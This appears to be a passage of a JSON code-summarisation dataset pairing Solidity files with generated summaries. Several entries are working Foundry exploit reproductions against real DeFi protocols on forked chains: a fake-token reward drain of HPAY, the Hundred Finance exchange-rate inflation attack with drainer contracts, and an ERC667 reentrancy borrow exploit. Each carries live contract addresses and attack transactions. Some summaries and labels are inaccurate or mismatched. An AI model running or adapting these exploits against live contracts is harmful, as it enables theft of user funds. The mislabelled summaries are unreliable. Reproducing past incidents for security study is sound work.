block.timestamp\n        );\n    }\n}",
        "summary": "This Solidity smart contract is a test script for exploiting a vulnerability in the DODO decentralized exchange on the Binance Smart Chain. It imports interfaces from other contracts and sets up the necessary tokens and addresses. The setup function calls a function from an external contract to create a fork. The testExploit function contains the code that exploits the vulnerability by making flash loans of a specific token and then swapping it back and forth between two other tokens to manipulate the price and earn a profit. The DPPFlashLoanCall function is called as part of the flash loan process and contains the main logic for swapping tokens.",
        "id": "9059639f-3909-4d09-bc30-60178d50dcda",
        "api_seq": "Thena_exp"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract HelloWeb3{\n    string public _string = \"Hello Web3!\";\n}\n",
        "summary": "This code defines a Solidity contract named \"HelloWeb3\" and sets a public string variable \"_string\" to the value \"Hello Web3!\". The \"// SPDX-License-Identifier: MIT\" at the top of the code is a comment that specifies the license under which the code is distributed. The \"pragma solidity ^0.8.4\" specifies the version of the Solidity compiler that should be used.",
        "id": "b6cd3b18-4267-4e88-afd9-b748335fafbf",
        "api_seq": "TimeManipulation"
    },
    {
        "code": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/Supremacy_CA/status/1582345448190140417\n// @Address\n// https://bscscan.com/address/0xab74fbd735cd2ed826b64e0f850a890930a91094\n\ninterface MintableAutoCompundRelockBonus{\n    function setToken(address) external;\n    function stake(uint256) external;\n    function withdraw(uint256) external;\n}\n\ncontract ContractTest is DSTest{\n    \n    IERC20 HPAY = IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);\n    IERC20 WBNB =IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    MintableAutoCompundRelockBonus Bonus = MintableAutoCompundRelockBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22280853); \n    }\n\n    function testExploit() external{\n        HPAY.approve(address(Router), type(uint).max);\n        // fake token deposit\n        SHITCOIN shitcoin = new SHITCOIN();\n        shitcoin.mint(100_000_000 * 1e18);\n        shitcoin.approve(address(Bonus), type(uint).max);\n        Bonus.setToken(address(shitcoin));\n        Bonus.stake(shitcoin.balanceOf(address(this)));\n        Bonus.setToken(address(HPAY));\n        // change block.number\n        cheats.roll(block.number + 1000);\n        // withdraw reward token\n        Bonus.withdraw(30_000_000 * 1e18);\n        HPAYToWBNB();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function HPAYToWBNB() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(HPAY);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            HPAY.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n\ncontract SHITCOIN {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"SHIT COIN\";\n    string public symbol = \"SHIT\";\n    uint8 public decimals = 18;\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}",
        "summary": "This is smart contract code written in Solidity. \n\nThe code imports libraries/interfaces from other contracts, and defines a new contract `ContractTest` which inherits from `DSTest`. `ContractTest` has a `setUp` function and a `testExploit` function.\n\nIn `setUp`, it sets up a new fork on Binance Smart Chain (BSC) using `Cheats.createSelectFork`.\n\nIn the `testExploit` function, the contract interacts with several other contracts and tokens on BSC, including a fake token (`SHITCOIN`), a token (`HPAY`), a router (`Uni_Router_V2`), and a `MintableAutoCompundRelockBonus` contract.\n\nThe exploit works by depositing the fake token into the `MintableAutoCompundRelockBonus` contract, changing the block number using `Cheats.roll`, withdrawing a large amount of HPAY, swapping HPAY for WBNB using `Uni_Router_V2`, and ending with a `log_named_decimal_uint`. There is no authentication or validation within this contract, and it is vulnerable to attacks.",
        "id": "9c68a1d7-3da2-4d2f-8dca-30535a0e2e25",
        "api_seq": "transaction"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1647307128267476992\n// https://twitter.com/danielvf/status/1647329491788677121\n// https://twitter.com/hexagate_/status/1647334970258608131\n// @TX\n// https://optimistic.etherscan.io/tx/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451\n// @Summary\n// check the log in the terminal\n\ncontract contractTest is Test {\n    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);\n    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);\n    IERC20 SNX = IERC20(0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4);\n    IERC20 sUSD = IERC20(0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9);\n    IERC20 USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);\n    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);\n    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);\n    crETH CEther = crETH(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);\n    ICErc20Delegate hSNX = ICErc20Delegate(0x371cb7683bA0639A21f31E0B20F705e45bC18896);\n    ICErc20Delegate hUSDC = ICErc20Delegate(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);\n    ICErc20Delegate hDAI = ICErc20Delegate(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);\n    ICErc20Delegate hUSDT = ICErc20Delegate(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD);\n    ICErc20Delegate hSUSD = ICErc20Delegate(0x76E47710AEe13581Ba5B19323325cA31c48d4cC3);\n    ICErc20Delegate hFRAX = ICErc20Delegate(0xd97a2591930E2Da927b1903BAA6763618BD7425b);\n    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    address HundredFinanceExploiter = 0x155DA45D374A286d383839b1eF27567A15E67528;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\n            \"optimism\",\n            90_760_765\n        );\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(SNX), \"SNX\");\n        cheats.label(address(sUSD), \"sUSD\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(DAI), \"DAI\");\n        cheats.label(address(hWBTC), \"hWBTC\");\n        cheats.label(address(CEther), \"CEther\");\n        cheats.label(address(hSNX), \"hSNX\");\n        cheats.label(address(hUSDC), \"hUSDC\");\n        cheats.label(address(hDAI), \"hDAI\");\n        cheats.label(address(hUSDT), \"hUSDT\");\n        cheats.label(address(hSUSD), \"hSUSD\");\n        cheats.label(address(hFRAX), \"hFRAX\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(unitroller), \"unitroller\");\n    }\n\n    function testExploit() external {\n        payable(address(0)).transfer(address(this).balance);\n        cheats.startPrank(HundredFinanceExploiter);\n        hWBTC.transfer(address(this), 1_503_167_295); // anti front-run ?\n        cheats.stopPrank();\n        aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 18);\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker SNX balance after exploit\", SNX.balanceOf(address(this)), SNX.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker sUSD balance after exploit\", sUSD.balanceOf(address(this)), sUSD.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        hWBTC.redeem(hWBTC.balanceOf(address(this)));\n\n        console.log(\"1. ETH Drain \\r\");\n        ETHDrains();\n        console.log(\"2. SNX Drain \\r\");\n        tokenDrains(hSNX, 100_532_823_967_026);\n        console.log(\"3. USDC Drain \\r\");\n        tokenDrains(hUSDC, 282);\n        console.log(\"4. DAI Drain \\r\");\n        tokenDrains(hDAI, 281_293_952_180_029);\n        console.log(\"5. USDT Drain\");\n        tokenDrains(hUSDT, 281);\n        console.log(\"6. SUSD Drain\");\n        tokenDrains(hSUSD, 281_135_788_585_887);\n        console.log(\"7. FRAX Drain \\r\");\n        tokenDrains(hFRAX, 281_293_952_180_029);\n\n        WBTC.approve(address(aaveV3), type(uint256).max);\n        return true;\n    }\n\n    function ETHDrains() internal {\n        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));\n        bytes memory creationBytecode = getETHDrainCreationBytecode(address(CEther));\n        address DrainAddress = getAddress(creationBytecode, _salt);\n        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));\n\n        ETHDrain ETHDrainer = new ETHDrain{salt: bytes32(_salt)}(CEther);\n        CEther.liquidateBorrow{value: 267_919_888_739}(address(ETHDrainer), address(hWBTC));\n        hWBTC.redeem(1); // Withdraw remaining share from hWBTC\n        console.log(\"*************************************************\");\n        console.log(\"\\r\");\n    }\n\n    function tokenDrains(ICErc20Delegate hToken, uint256 repayAmount) internal {\n        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));\n        bytes memory creationBytecode = gettokenDrainCreationBytecode(address(hToken));\n        address DrainAddress = getAddress(creationBytecode, _salt);\n        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));\n\n        tokenDrain tokenDrainer = new tokenDrain{salt: bytes32(_salt)}(hToken);\n        IERC20 underlyingToken = IERC20(hToken.underlying());\n        underlyingToken.approve(address(hToken), type(uint256).max);\n        hToken.liquidateBorrow(address(tokenDrainer), repayAmount, address(hWBTC));\n        hWBTC.redeem(1); // Withdraw remaining share from hWBTC\n        console.log(\"*************************************************\");\n        console.log(\"\\r\");\n    }\n\n    function getETHDrainCreationBytecode(address token) public pure returns (bytes memory) {\n        bytes memory bytecode = type(ETHDrain).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(token));\n    }\n\n    function gettokenDrainCreationBytecode(address token) public pure returns (bytes memory) {\n        bytes memory bytecode = type(tokenDrain).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(token));\n    }\n\n    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {\n        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));\n        return address(uint160(uint256(hash)));\n    }\n\n    receive() external payable {}\n}\n\ncontract ETHDrain is Test {\n    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);\n    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);\n    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);\n    crETH CEtherDelegate;\n\n    constructor(crETH Delegate) payable {\n        console.log(\"First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares\");\n        CEtherDelegate = Delegate;\n        WBTC.approve(address(hWBTC), type(uint256).max);\n        hWBTC.mint(4 * 1e8);\n        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum\n        console2.log(\n            \"ETHDrain's share in hWBTC:\",\n            hWBTC.balanceOf(address(this)),\n            \"the WBTC amount in hWBTC:\",\n            WBTC.balanceOf(address(hWBTC))\n        );\n        console.log(\"\\r\");\n\n        console.log(\n            \"Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)\"\n        );\n        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));\n        console.log(\"exchangeRate before manipulation:\", exchangeRate_1);\n        uint256 donationAmount = WBTC.balanceOf(address(this));\n        WBTC.transfer(address(hWBTC), donationAmount); // \"donation\" exchangeRate manipulation\n        uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));\n        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));\n        console.log(\"exchangeRate after manipulation:\", exchangeRate_2);\n        console.log(\"\\r\");\n\n        console.log(\"Third setp, Lend tokens from the hWBTC pool and send to exploiter\");\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(hWBTC);\n        unitroller.enterMarkets(cTokens);\n        uint256 borrowAmount = CEtherDelegate.getCash() - 1;\n        CEtherDelegate.borrow(borrowAmount);\n        payable(address(msg.sender)).transfer(address(this).balance);\n        console.log(\"\\r\");\n\n        console.log(\"Fouth step, redeem WBTC from the hWBTC pool\");\n        uint256 redeemAmount = donationAmount - 1;\n        console.log(\n            \"Calculate the amount of shares represented by the redeem amount:\",\n            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC\n        );\n        console.log(\n            \"another way of calculating, redeemAmount * 1e18 / exchangeRate:\", redeemAmount * 1e18 / exchangeRate_2\n        );\n        console.log(\n            \"Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:\",\n            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC\n        );\n        hWBTC.redeemUnderlying(redeemAmount);\n        console2.log(\n            \"after redeem the ETHDrain's share in hWBTC:\",\n            hWBTC.balanceOf(address(this)),\n            \"the WBTC amount in hWBTC:\",\n            WBTC.balanceOf(address(hWBTC))\n        );\n        console.log(\"\\r\");\n\n        console.log(\"Firth step, send WBTC to exploiter\");\n        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));\n        console.log(\"\\r\");\n    }\n\n    receive() external payable {}\n}\n\ncontract tokenDrain is Test {\n    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);\n    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);\n    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);\n    ICErc20Delegate CErc20Delegate;\n\n    constructor(ICErc20Delegate Delegate) payable {\n        console.log(\"First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares\");\n        CErc20Delegate = Delegate;\n        WBTC.approve(address(hWBTC), type(uint256).max);\n        hWBTC.mint(4 * 1e8);\n        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum\n        console2.log(\n            \"toeknDrain's share in hWBTC:\",\n            hWBTC.balanceOf(address(this)),\n            \"the WBTC amount in hWBTC:\",\n            WBTC.balanceOf(address(hWBTC))\n        );\n        console.log(\"\\r\");\n\n        console.log(\n            \"Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)\"\n        );\n        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));\n        console.log(\"exchangeRate before manipulation:\", exchangeRate_1);\n        uint256 donationAmount = WBTC.balanceOf(address(this));\n        WBTC.transfer(address(hWBTC), donationAmount); // \"donation\" exchangeRate manipulation\n        uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));\n        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));\n        console.log(\"exchangeRate after manipulation:\", exchangeRate_2);\n        console.log(\"\\r\");\n\n        console.log(\"Third setp, Lend tokens from the hWBTC pool and send to exploiter\");\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(hWBTC);\n        unitroller.enterMarkets(cTokens);\n        uint256 borrowAmount = CErc20Delegate.getCash() - 1;\n        CErc20Delegate.borrow(borrowAmount);\n        IERC20 underlyingToken = IERC20(CErc20Delegate.underlying());\n        underlyingToken.transfer(msg.sender, borrowAmount); // borrow token and send to exploiter\n        console.log(\"\\r\");\n\n        console.log(\"Fouth step, redeem WBTC from the hWBTC pool\");\n        uint256 redeemAmount = donationAmount;\n        console.log(\n            \"Calculate the amount of shares represented by the redeem amount:\",\n            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC\n        );\n        console.log(\n            \"another way of calculating, redeemAmount * 1e18 / exchangeRate:\", redeemAmount * 1e18 / exchangeRate_2\n        );\n        console.log(\n            \"Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:\",\n            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC\n        );\n        hWBTC.redeemUnderlying(redeemAmount);\n        console2.log(\n            \"after redeem the toeknDrain's share in hWBTC:\",\n            hWBTC.balanceOf(address(this)),\n            \"the WBTC amount in hWBT:C\",\n            WBTC.balanceOf(address(hWBTC))\n        );\n        console.log(\"\\r\");\n\n        console.log(\"Firth step, send WBTC to exploiter\");\n        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));\n        console.log(\"\\r\");\n    }\n}\n",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in the Hundred Finance protocol on the Optimistic Ethereum network. The contract contains multiple functions and two helper contracts that perform the actual exploit.\n\nThe `testExploit()` function is the main entry point of the contract and triggers the exploit by calling the `executeOperation()` function of the `aaveV3` contract. This function uses the `ETHDrain` and `tokenDrain` contracts to drain funds from the `hWBTC` contract and transfer them to the contract caller's address.\n\nThe `setUp()` function initializes the `cheats` object, which is used to interact with the Ethereum Virtual Machine during the exploit.\n\nThe `getAddress()`, `getETHDrainCreationBytecode()`, and `gettokenDrainCreationBytecode()` functions are helper functions that generate the address and bytecode for the `ETHDrain` and `tokenDrain` contracts.\n\nThe `ETHDrain` and `tokenDrain` contracts are used to execute the actual exploit.",
        "id": "adebf2c6-17d0-4dac-b673-a5aa7ac228c8",
        "api_seq": "Upswing_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nRoot cause: ERC667 tokens hooks reentrancy.\n\nAttacker wallet: 0xd041ad9aae5cf96b21c3ffcb303a0cb80779e358\nAttacker contract: 0xdbf225e3d626ec31f502d435b0f72d82b08e1bdd\nAttack tx: https://gnosisscan.io/tx/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098\nDebug tx: https://dashboard.tenderly.co/tx/xdai/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098\n\n Vulnerable contract:\n 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee\n 0xe4e43864ea18d5e5211352a4b810383460ab7fcc\n 0x8e15a22853a0a60a0fbb0d875055a8e66cff0235\n 0x090a00a2de0ea83def700b5e216f87a5d4f394fe\n\nref: https://github.com/compound-finance/compound-protocol/issues/141\ncredit: https://github.com/Hephyrius/Immuni-Hundred-POC\n*/\ninterface ICompoundToken {\n    function borrow(uint256 borrowAmount) external;\n    function repayBorrow(uint256 repayAmount) external;\n    function redeem(uint256 redeemAmount) external;\n    function mint(uint256 amount) external;\n    function comptroller() external view returns(address);\n}\n\ninterface IComptroller {\n    function allMarkets() external view returns(address[] memory);\n}\n\ninterface ICurve {\n    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;\n}\n\ninterface IWeth {\n    function deposit() external payable;\n}\n\ncontract ContractTest is Test {\n\n    IERC20 private constant usdc  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);\n    IERC20 private constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);\n\n    address private constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee;\n    address private constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE;\n\n    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);\n    IUniswapV2Router private constant router = IUniswapV2Router(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));\n\n\n    uint totalBorrowed;\n    bool xdaiBorrowed = false;\n\n  function setUp() public {\n    vm.createSelectFork(\"gnosis\", 21120319); //fork gnosis at block number 21120319\n  }\n\n  function testExploit() public {\n        borrow();\n        console.log(\"Attacker Profit: %s usdc\", usdc.balanceOf(address(this))/1e6);\n  }\n\n    function borrow() internal {\n        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());\n        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(wxdai), address(usdc)));\n        uint borrowAmount = usdc.balanceOf(address(pair)) - 1;\n\n        pair.swap(\n            pair.token0() == address(wxdai) ? 0 : borrowAmount,\n            pair.token0() == address(wxdai) ? borrowAmount : 0,\n            address(this),\n            abi.encode(\"0x\")\n        );\n        \n    }\n    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data ) external {\n        attackLogic(_amount0, _amount1, _data);\n    }\n\n    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data ) internal {\n        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;\n        totalBorrowed = amountToken;\n        console.log(\"Borrowed: %s USDC from Sushi\", usdc.balanceOf(address(this))/1e6);\n        depositUsdc();\n        borrowUsdc();\n        swapXdai();\n        uint amountRepay = ((amountToken * 1000) / 997) + 1;\n        usdc.transfer(msg.sender, amountRepay);\n        console.log(\"Repay Flashloan for : %s USDC\", amountRepay/1e6);\n    }\n    function depositUsdc() internal {\n        uint balance = usdc.balanceOf(address(this));\n        usdc.approve(husd, balance);\n        ICompoundToken(husd).mint(balance);\n    }\n\n    function borrowUsdc() internal {\n        uint amount = (totalBorrowed * 90) / 100;\n        ICompoundToken(husd).borrow(amount);\n        console.log(\"Attacker USDC Balance After Borrow: %s USDC\", usdc.balanceOf(address(this))/1e6);\n        console.log(\"Hundred USDC Balance After Borrow: %s USDC\", usdc.balanceOf(husd)/1e6);\n\n    }\n\n    function borrowXdai() internal {\n        xdaiBorrowed = true;\n        uint amount = ((totalBorrowed * 1e12) * 60) / 100;\n\n        ICompoundToken(hxdai).borrow(amount);\n        console.log(\"Attacker xdai Balance After Borrow: %s XDAI\", address(this).balance/1e8);\n        console.log(\"Hundred xdai Balance After Borrow: %s Xdai\", address(hxdai).balance/1e8);\n    }\n\n    function swapXdai() internal {\n        IWeth(payable(address(wxdai))).deposit{value: address(this).balance}();\n        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));\n        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);\n    }\n\n    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {\n        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());\n        address pair = factory.getPair(address(wxdai), address(usdc));\n\n        if(_from != pair && xdaiBorrowed == false){\n            console.log(\"''i'm in!''\");\n            borrowXdai();\n        }\n    }\n  receive() external payable {}\n}\n",
        "summary": "This code is a test contract that demonstrates a vulnerability with ERC667 tokens. The contract imports other interfaces and uses Uniswap and Curve protocols to exploit the vulnerability and borrow funds from the vulnerable contracts. The contract exploits a vulnerability that allows executing\u00a0a malicious attack within the hooks of ERC667 tokens. Within the attack, the contract borrows funds, swaps them, and repays the loan. The contract is only for testing purposes and should not be used in a live environment.",
        "id": "c5201032-ea60-41ba-a4d3-6ca5ad98f47d"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface IBase64 {\n    function encode(\n        bytes calldata data,\n        bool base64Url\n    ) external pure returns (string[] memory);\n\n    function decode(\n        string calldata data,\n        bool base64Url\n    ) external pure returns (bytes[] memory);\n}\n",
        "summary": "This code defines an interface called \"IBase64\" in Solidity programming language. This interface includes two functions: \"encode\" and \"decode\", both of which take parameters and returns values. The \"encode\" function takes \"data\" as a bytes argument and \"base64Url\" as a boolean argument, and returns an array of encoded strings. The \"decode\" function takes \"data\" as a string argument and \"base64Url\" as a boolean argument, and returns an array of decoded bytes. The SPDX-License-Identifier comment at the beginning of the code specifies the open-source license under which the code is released. The pragma solidity directive specifies the version of the Solidity compiler that the code should be compiled with.",
        "id": "1acdb3c8-30f3-4698-b2d6-d755e0152baa"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\n\ninterface IBatchDistributor {\n    struct Transaction {\n        address recipient;\n        uint256 amount;\n    }\n\n    struct Batch {\n        Transaction[] txns;\n    }\n\n    function distribute_ether(Batch calldata batch) external payable;\n\n    function distribute_token(IERC20 token, Batch calldata batch) external;\n}\n",
        "summary": "The code defines an interface for a contract called IBatchDistributor. It contains two structs, Transaction and Batch. The contract has two functions: distribute_ether and distribute_token. \n\nThe distribute_ether function takes a Batch as its argument and distributes Ether to the recipients specified in the batch's transactions.\n\nThe distribute_token function takes an IERC20 token and a Batch as its arguments and distributes the specified token to the recipients specified in the batch's transactions.",
        "id": "745219aa-1afe-4bc8-8ad4-1908ad1b7d21"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface ICreate2Address {\n    function compute_address_self(\n        bytes32 salt,\n        bytes32 bytecodeHash\n    ) external view returns (address);\n\n    function compute_address(\n        bytes32 salt,\n        bytes32 bytecodeHash,\n        address deployer\n    ) external view returns (address);\n}\n",
        "summary": "This code defines an interface called \"ICreate2Address\" which includes two external view functions. Both functions take two arguments \"salt\" and \"bytecodeHash\", but the second function also takes an additional argument \"deployer\". These functions compute and return an Ethereum address corresponding to the supplied arguments. The SPDX-License-Identifier line specifies the license under which the code is released, and the pragma statement specifies the version of the Solidity compiler to use for this code.",
        "id": "37a0f474-cfbd-42d4-86f9-a7823607f644"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface ICreateAddress {\n    function compute_address_rlp_self(\n        uint256 nonce\n    ) external view returns (address);\n\n    function compute_address_rlp(\n        address deployer,\n        uint256 nonce\n    ) external view returns (address);\n}\n",
        "summary": "This code defines an interface called \"ICreateAddress\" with two external view functions: \"compute_address_rlp_self\" and \"compute_address_rlp\". Both functions take a uint256 parameter called \"nonce\" and return an Ethereum address. The first function calculates and returns the address using the interface address as the deployer, while the second function uses an external address as the deployer. The code also includes a license declaration at the top, specifying the terms under which the code can be used.",
        "id": "21a2c918-de41-4a7d-bf5a-99533bdc92b2"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface IECDSA {\n    function recover_sig(\n        bytes32 hash,\n        bytes calldata signature\n    ) external pure returns (address);\n\n    function to_eth_signed_message_hash(\n        bytes32 hash\n    ) external pure returns (bytes32);\n\n    function to_typed_data_hash(\n        bytes32 domainSeparator,\n        bytes32 structHash\n    ) external pure returns (bytes32);\n\n    function to_data_with_intended_validator_hash_self(\n        bytes calldata data\n    ) external view returns (bytes32);\n\n    function to_data_with_intended_validator_hash(\n        address validator,\n        bytes calldata data\n    ) external pure returns (bytes32);\n}\n",
        "summary": "This code defines an interface for a smart contract that provides a set of functions related to ECDSA (Elliptic Curve Digital Signature Algorithm). The functions allow for the recovery of signatures, conversion of hash values, and verification of data with intended validators. The code also specifies the use of the WTFPL license and requires a Solidity version of at least 0.8.19.",
        "id": "24f612e8-3933-4b63-9644-c01ad87fffc3"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface IEIP712DomainSeparator {\n    function domain_separator_v4() external view returns (bytes32);\n\n    function hash_typed_data_v4(\n        bytes32 structHash\n    ) external view returns (bytes32);\n}\n",
        "summary": "This code defines an interface called `IEIP712DomainSeparator` that includes two functions. The `domain_separator_v4` function is a view function that returns a `bytes32` value representing the EIP-712 domain separator. The `hash_typed_data_v4` function is also a view function that returns the hash of a given `structHash`. Additionally, the code specifies the Solidity compiler version used as `^0.8.19` and sets the license identifier to `WTFPL`.",
        "id": "9fa8a177-0dcc-44f9-813e-6c145f218138"
    },
    {
